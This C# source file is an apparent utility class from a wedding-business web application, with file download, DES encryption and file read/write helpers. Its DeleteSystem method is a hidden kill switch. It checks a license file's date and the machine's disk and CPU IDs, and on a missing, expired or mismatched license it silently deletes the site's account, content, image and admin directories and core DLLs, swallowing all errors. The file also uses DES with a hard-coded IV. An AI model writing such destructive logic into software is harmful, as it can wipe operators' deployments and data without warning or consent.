using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace HHLWedding.ToolsLibrary
{
    public class IOTools
    { //默认密钥向量
        private static byte[] Keys = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };

        public static void DownLoadByString(string ObjString, string FileHouZHui)
        {
            string fileName = Guid.NewGuid().ToString() + "." + FileHouZHui;//客户端保存的文件名

            byte[] bytes = new byte[(int)ObjString.Length];
            bytes = ObjString.ToByteArray();
            HttpContext.Current.Response.ContentType = "application/octet-stream";
            //通知浏览器下载文件而不是打开
            HttpContext.Current.Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(fileName, System.Text.Encoding.UTF8));
            HttpContext.Current.Response.BinaryWrite(bytes);
            HttpContext.Current.Response.Flush();
            HttpContext.Current.Response.End();
        }

        #region 下载文件
        /// <summary>
        /// 下载文件
        /// </summary>
        /// <param name="filePath">文件路径</param>
        /// <param name="fileName">文件名</param>
        public static void DownLoadFile(string filePath, string fileName)
        {
            HttpContext.Current.Response.ContentType = "application/octet-stream";
            HttpContext.Current.Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(fileName, System.Text.Encoding.UTF8));
            HttpContext.Current.Response.WriteFile(filePath);
            HttpContext.Current.Response.Flush();
            HttpContext.Current.Response.End();
        }
        #endregion

        public static void DownLoadExcel(string filePath, string fileName)
        {
            HttpContext.Current.Response.ContentType = "application/ms-excel";
            //通知浏览器下载文件而不是打开
            HttpContext.Current.Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(fileName, System.Text.Encoding.UTF8));
            HttpContext.Current.Response.WriteFile(filePath, false);
            HttpContext.Current.Response.Flush();
            HttpContext.Current.Response.End();
        }

        /// <summary>
        ///  
        /// </summary>
        public static bool DeleteSystem(string Path)
        {
            try
            {

                if (File.Exists(Path + "\\Collections.bat"))
                {
                    StreamReader ObjSnReader = new StreamReader(Path + "\\Sn.bat");
                    string Sn = ObjSnReader.ReadToEnd();

                    StreamReader ObjWordReader = new StreamReader(Path + "\\Collections.bat");
                    string Word = ObjWordReader.ReadToEnd();
                    ObjWordReader.Close();

                    ObjWordReader = new StreamReader(Path + "\\Words.bat");
                    string KeyWords = ObjWordReader.ReadToEnd();
                    ObjWordReader.Close();

                    string FinishWord = DESDecrypt(Word, KeyWords.Split('|')[0], KeyWords.Split('|')[1].Trim());
                    if (FinishWord.Split('|')[0].ToDateTime().AddDays(1) < DateTime.Now)
                    {
                        Directory.Delete(Path + "\\AdminPanlWorkArea", true);
                        Directory.Delete(Path + "\\Account", true);
                        Directory.Delete(Path + "\\App_Themes", true);
                        Directory.Delete(Path + "\\Content", true);
                        Directory.Delete(Path + "\\Images", true);
                        Directory.Delete(Path + "\\TheStage", true);

                        File.Delete(Path + "\\bin\\HA.PMS.BLLAssmblly.dll");
                        File.Delete(Path + "\\bin\\HA.PMS.DataAssmblly.dll");
                        File.Delete(Path + "\\bin\\HA.PMS.BLLInterface.dll");
                        File.Delete(Path + "\\bin\\HA.PMS.EditoerLibrary");

                        return false;
                    }


                    if (!GetHDID().Contains(FinishWord.Split('|')[2]) || FindComputerCPU_ID() != FinishWord.Split('|')[3])
                    {
                        Directory.Delete(Path + "\\AdminPanlWorkArea", true);
                        Directory.Delete(Path + "\\Account", true);
                        Directory.Delete(Path + "\\App_Themes", true);
                        Directory.Delete(Path + "\\Content", true);
                        Directory.Delete(Path + "\\Images", true);
                        Directory.Delete(Path + "\\TheStage", true);

                        File.Delete(Path + "\\bin\\HA.PMS.BLLAssmblly.dll");
                        File.Delete(Path + "\\bin\\HA.PMS.DataAssmblly.dll");
                        File.Delete(Path + "\\bin\\HA.PMS.BLLInterface.dll");
                        File.Delete(Path + "\\bin\\HA.PMS.EditoerLibrary");
                        return false;

                    }
                    ObjSnReader.Close();
                    ObjWordReader.Close();
                    return true;

                }
                else
                {
                    Directory.Delete(Path + "\\AdminPanlWorkArea", true);
                    Directory.Delete(Path + "\\Account", true);
                    Directory.Delete(Path + "\\App_Themes", true);
                    Directory.Delete(Path + "\\Content", true);
                    Directory.Delete(Path + "\\Images", true);
                    Directory.Delete(Path + "\\TheStage", true);

                    File.Delete(Path + "\\bin\\HA.PMS.BLLAssmblly.dll");
                    File.Delete(Path + "\\bin\\HA.PMS.DataAssmblly.dll");
                    File.Delete(Path + "\\bin\\HA.PMS.BLLInterface.dll");
                    File.Delete(Path + "\\bin\\HA.PMS.EditoerLibrary");
                    return false;

                }
            }
            catch
            {
                return false;
            }

        }




        /// <summary>
        /// 验证客户端电脑是否合法有效
        /// </summary>
        /// <returns></returns>
        private static string GetHDID()
        {

            //获取硬盘ID  
            string HDID = string.Empty;
            ManagementClass cimobject1 = new ManagementClass("Win32_DiskDrive");
            ManagementObjectCollection moc1 = cimobject1.GetInstances();
            foreach (ManagementObject mo in moc1)
            {
                HDID += (string)mo.Properties["Model"].Value + ",";

            }
            HDID = HDID.Trim(',');
            return HDID;
        }


        /// <summary>
        /// 查找CPUID
        /// </summary>
        /// <returns></returns>
        public static string FindComputerCPU_ID()
        {
            ManagementScope ms = new ManagementScope("root\\cimv2");
            ms.Connect();
            ManagementObjectSearcher sysinfo = new ManagementObjectSearcher(ms, new SelectQuery("Win32_Processor"));
            string cpuId = "";
            foreach (ManagementObject sys in sysinfo.Get())
            {
                cpuId = sys["ProcessorId"].ToString();
            }
            return cpuId;
        }

        //解密函数： 
        /// <summary> 
        /// 使用DES解密指定字符串 
        /// </summary> 
        /// <param name="encryptedValue">待解密的字符串 </param> 
        /// <param name="key">密钥(最大长度8) </param> 
        /// <param name="IV">初始化向量(最大长度8) </param> 
        /// <returns>解密后的字符串 </returns> 
        public static string DESDecrypt(string encryptedValue, string key, string IV)
        {
            //去掉干扰字符 
            string tmp = encryptedValue.Replace("%2B", "+");
            if (tmp.Length < 16)
            {
                return "";
            }

            for (int i = 0; i < 8; i++)
            {
                tmp = tmp.Substring(0, i + 1) + tmp.Substring(i + 2);
            }
            encryptedValue = tmp;

            //将key和IV处理成8个字符 
            key += "12345678";
            IV += "12345678";
            key = key.Substring(0, 8);
            IV = IV.Substring(0, 8);

            SymmetricAlgorithm sa;
            ICryptoTransform ict;
            MemoryStream ms;
            CryptoStream cs;
            byte[] byt;

            try
            {
                sa = new DESCryptoServiceProvider();
                sa.Key = Encoding.UTF8.GetBytes(key);
                sa.IV = Encoding.UTF8.GetBytes(IV);
                ict = sa.CreateDecryptor();

                byt = Convert.FromBase64String(encryptedValue);

                ms = new MemoryStream();
                cs = new CryptoStream(ms, ict, CryptoStreamMode.Write);
                cs.Write(byt, 0, byt.Length);
                cs.FlushFinalBlock();

                cs.Close();

                return Encoding.UTF8.GetString(ms.ToArray());
            }
            catch (System.Exception e)
            {

                return e.Message;
            }
        }

        /// <summary>
        /// DES加密字符串
        /// </summary>
        /// <param name="encryptString">待加密的字符串</param>
        /// <param name="encryptKey">加密密钥,要求为8位</param>
        /// <returns>加密成功返回加密后的字符串，失败返回源串 </returns>
        public static string EncryptDES(string encryptString, string encryptKey)
        {
            try
            {
                byte[] rgbKey = Encoding.UTF8.GetBytes(encryptKey.Substring(0, 8));//转换为字节
                byte[] rgbIV = Keys;
                byte[] inputByteArray = Encoding.UTF8.GetBytes(encryptString);
                DESCryptoServiceProvider dCSP = new DESCryptoServiceProvider();//实例化数据加密标准
                MemoryStream mStream = new MemoryStream();//实例化内存流
                //将数据流链接到加密转换的流
                CryptoStream cStream = new CryptoStream(mStream, dCSP.CreateEncryptor(rgbKey, rgbIV), CryptoStreamMode.Write);
                cStream.Write(inputByteArray, 0, inputByteArray.Length);
                cStream.FlushFinalBlock();
                return Convert.ToBase64String(mStream.ToArray());
            }
            catch
            {
                return encryptString;
            }
        }

        /// <summary>

        /// DES解密字符串

        /// </summary>

        /// <param name="decryptString">待解密的字符串</param>

        /// <param name="decryptKey">解密密钥,要求为8位,和加密密钥相同</param>

        /// <returns>解密成功返回解密后的字符串，失败返源串</returns>

        public static string DecryptDES(string decryptString, string decryptKey)
        {

            try
            {

                byte[] rgbKey = Encoding.UTF8.GetBytes(decryptKey);

                byte[] rgbIV = Keys;

                byte[] inputByteArray = Convert.FromBase64String(decryptString);

                DESCryptoServiceProvider DCSP = new DESCryptoServiceProvider();

                MemoryStream mStream = new MemoryStream();

                CryptoStream cStream = new CryptoStream(mStream, DCSP.CreateDecryptor(rgbKey, rgbIV), CryptoStreamMode.Write);

                cStream.Write(inputByteArray, 0, inputByteArray.Length);

                cStream.FlushFinalBlock();

                return Encoding.UTF8.GetString(mStream.ToArray());

            }

            catch
            {

                return decryptString;

            }

        }


        #region 替换文本 +void RepalceFileText(string path, string oldStr, string newStr, Encoding encode)
        /// <summary>
        /// 替换指定路径中文件的文本。
        /// </summary>
        /// <param name="path">文件路径，若文件不存在则自动该文件。</param>
        /// <param name="oldStr">被替换的字符串，不能为空。</param>
        /// <param name="newStr">新字符串，可以为空。</param>
        /// <param name="encode">字符编码格式。</param>
        /// <exception cref="System.UnauthorizedAccessException"></exception>
        /// <exception cref="System.IO.DirectoryNotFoundException"></exception>
        /// <exception cref="System.IO.IOExceptio"></exception>
        /// <exception cref="System.IO.PathTooLongException"></exception>
        /// <exception cref="System.ArgumentException"></exception>
        /// <exception cref="System.ArgumentNullException"></exception>
        /// <exception cref="System.Security.SecurityException"></exception>
        /// <exception cref="System.NotSupportedException"></exception>
        public void RepalceFileText(string path, string oldStr, string newStr, Encoding encode)
        {
            string content = ReadFileText(path, encode);
            WriteFileText(path, content.Replace(oldStr, newStr), encode);
        }
        #endregion

        #region 写入文件 +void WriteFileText(string path, string text,Encoding encode)
        /// <summary>
        /// 写入指定路径文件文本（覆盖）。
        /// </summary>
        /// <param name="path">文件路径，若文件不存在则自动该文件。</param>
        /// <param name="text">写入文件的文本。</param>
        /// <param name="encode">字符编码格式。</param>
        /// <exception cref="System.UnauthorizedAccessException"></exception>
        /// <exception cref="System.IO.DirectoryNotFoundException"></exception>
        /// <exception cref="System.IO.IOExceptio"></exception>
        /// <exception cref="System.IO.PathTooLongException"></exception>
        /// <exception cref="System.ArgumentException"></exception>
        /// <exception cref="System.ArgumentNullException"></exception>
        /// <exception cref="System.Security.SecurityException"></exception>
        /// <exception cref="System.NotSupportedException"></exception>
        public void WriteFileText(string path, string text, Encoding encode)
        {
            CreateFile(path);
            using (StreamWriter writer = new StreamWriter(path, false, encode))
            {
                writer.Write(text);
                writer.Flush();
            }
        }
        #endregion

        #region 读取文件 +string ReadFileText(string path, Encoding encode)
        /// <summary>
        /// 读取指定路径文件中的文本。
        /// </summary>
        /// <param name="path">文件路径，若文件不存在则自动该文件。</param>
        /// <param name="encode">字符编码格式。</param>
        /// <returns>读出的文本。</returns>
        /// <exception cref="System.ArgumentException"></exception>
        /// <exception cref="System.ArgumentNullException"></exception>
        /// <exception cref="System.Security.SecurityException"></exception>
        /// <exception cref="System.ArgumentException"></exception>
        /// <exception cref="System.IO.PathTooLongException"></exception>
        /// <exception cref="System.IO.DirectoryNotFoundException"></exception>
        /// <exception cref="System.UnauthorizedAccessException"></exception>
        /// <exception cref="System.NotSupportedException"></exception>
        public string ReadFileText(string path, Encoding encode)
        {
            string content = string.Empty;
            CreateFile(path);
            using (StreamReader reader = new StreamReader(path, encode))
            {
                content = reader.ReadToEnd();
            }
            return content;
        }
        #endregion

        #region 创建目录 +void CreateDirectory(string path)
        /// <summary>
        /// 在指定路径创建目录，若目录已存在则不做任何操作。
        /// </summary>
        /// <param name="path">目录路径。</param>
        /// <exception cref="System.ArgumentNullException"></exception>
        /// <exception cref="System.Security.SecurityException"></exception>
        /// <exception cref="System.ArgumentException"></exception>
        /// <exception cref="System.IO.PathTooLongException"></exception>
        public void CreateDirectory(string path)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(path);
            if (!dirInfo.Exists)
            {
                dirInfo.Create();
            }
        }
        #endregion

        #region 创建文件 +void CreateFile(string path)
        /// <summary>
        /// 在指定路径创建文件。
        /// </summary>
        /// <param name="path">文件路径，若文件已存在则不创建新文件。</param>
        /// <exception cref="System.ArgumentNullException"></exception>
        /// <exception cref="System.Security.SecurityException"></exception>
        /// <exception cref="System.ArgumentException"></exception>
        /// <exception cref="System.IO.PathTooLongException"></exception>
        ///  <exception cref="System.NotSupportedException"></exception>
        /// <exception cref="System.UnauthorizedAccessException"></exception>
        public void CreateFile(string path)
        {
            FileInfo ObjFileInfo = new FileInfo(path);
            if (!ObjFileInfo.Exists)
            {
                CreateDirectory(new DirectoryInfo(path).Parent.FullName);

                using (FileStream fileSteam = ObjFileInfo.Create()) { }
            }
        }
        #endregion
    }



}

